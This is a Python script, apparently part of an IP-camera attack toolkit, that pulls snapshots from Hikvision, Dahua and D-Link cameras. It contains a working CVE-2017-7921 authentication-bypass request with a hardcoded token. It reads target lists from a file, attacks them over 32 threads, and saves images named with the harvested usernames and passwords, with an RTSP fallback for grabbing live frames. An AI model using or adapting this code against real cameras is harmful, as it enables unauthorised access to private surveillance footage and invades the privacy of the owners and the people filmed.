"""Some tools about camera"""
import os
import sys
import requests
import argparse
from functools import partial
from xml.etree import ElementTree
from requests.auth import HTTPDigestAuth

import rtsp
from PIL import Image

CWD = os.path.dirname(__file__)
sys.path.append(os.path.join(CWD, '..'))
from utils.base import multi_thread
from utils.net import get_user_agent
from utils.config import TIMEOUT, MAX_RETRIES, DEBUG


def get_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=False)
    parser.add_argument('--port', type=str, required=False)
    parser.add_argument('--user', type=str, required=False)
    parser.add_argument('--passwd', type=str, required=False)
    parser.add_argument('--device', type=str, required=False)
    parser.add_argument('--vulnerability', type=str, required=False)
    parser.add_argument('--in_file', type=str, required=False, default='')
    parser.add_argument('--sv_path', type=str, required=True)

    args = parser.parse_args()
    return args


def save_snapshot(args) -> None:
    snapshot_path = os.path.join(args.sv_path, 'snapshots')
    if not os.path.exists(snapshot_path): os.makedirs(snapshot_path)

    # snapshot all the targets in the file
    if args.in_file:
        with open(args.in_file, 'r') as f: items = [l.strip().split(',') for l in f if l.strip()]
        _func = partial(snapshot_switch, snapshot_path=snapshot_path)
        multi_thread(_func, items, processes=32)
    else:
        camera_info = [args.ip, args.port, args.user, args.passwd, args.device, args.vulnerability]
        snapshot_switch(camera_info, snapshot_path)


def snapshot_switch(camera_info, snapshot_path):
    """select diff func to save snapshot"""
    ip, port, user, passwd, device, vul = camera_info
    # cve-2017-7921
    if vul == 'cve-2017-7921':
        file_name = os.path.join(snapshot_path, f"{ip}-{port}-cve_2017_7921.jpg")
        url = f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK"
        snapshot_by_url(url, file_name)
    # if we can get the password
    elif passwd:
        file_name = os.path.join(snapshot_path, f"{ip}-{port}-{user}-{passwd}.jpg")
        # Hikvision
        if device == 'Hikvision':
            # get channels
            channels = 1
            try:
                r = requests.get(f"http://{ip}:{port}/ISAPI/Image/channels", auth=HTTPDigestAuth(user, passwd))
                root = ElementTree.fromstring(r.text)
                channels = len(root)
            except Exception as e:
                if DEBUG: print(e)
            # get all snapshots of all channels
            for ch in range(1, channels + 1):
                url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{ch}01/picture"
                file_name = os.path.join(snapshot_path, f"{ip}-{port}-channel{ch}-{user}-{passwd}.jpg")
                snapshot_by_url(url, file_name, auth=HTTPDigestAuth(user, passwd))
        # Dahua
        elif device == 'Dahua':
            url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
            snapshot_by_url(url, file_name, auth=HTTPDigestAuth(user, passwd))
        # DLink
        elif device == 'DLink':
            url = f"http://{ip}:{port}/dms?nowprofileid=1"
            snapshot_by_url(url, file_name, auth=(user, passwd))


def snapshot_by_url(url, file_name, auth=None):
    for _ in range(MAX_RETRIES):
        try:
            headers = {'User-Agent': get_user_agent(), }
            if auth: r = requests.get(url, auth=auth, timeout=TIMEOUT, verify=False, headers=headers)
            else: r = requests.get(url, timeout=TIMEOUT, verify=False, headers=headers)
            if r.status_code == 200:
                with open(file_name, 'wb') as f: f.write(r.content)
                break
        except Exception as e:
            if DEBUG: print(e)


# This one is not always work! Many bugs...
def snapshot_by_rtsp(ip, port, user, passwd, sv_path, multiplay=False):
    """get snapshot through rtsp """
    try:
        if not multiplay: url = f"rtsp://{user}:{passwd}@{ip}:554"
        else: url = f"rtsp://{user}:{passwd}@{ip}:554/h264/ch0/main/av_stream"
        with rtsp.Client(rtsp_server_uri=url, verbose=False) as client:
            while client.isOpened():
                img_bgr = client.read(raw=True)
                if not img_bgr is None:
                    img_rgb = img_bgr.copy()
                    img_rgb[:,:,0] = img_bgr[:,:,2]
                    img_rgb[:,:,1] = img_bgr[:,:,1]
                    img_rgb[:,:,2] = img_bgr[:,:,0]
                    name = f"{ip}-{port}-{user}-{passwd}.jpg"
                    img = Image.fromarray(img_rgb)
                    img.save(os.path.join(sv_path, name))
                    break
    except Exception as e:
        if DEBUG: print(e)


if __name__ == '__main__':
    args = get_parser()
    save_snapshot(args)
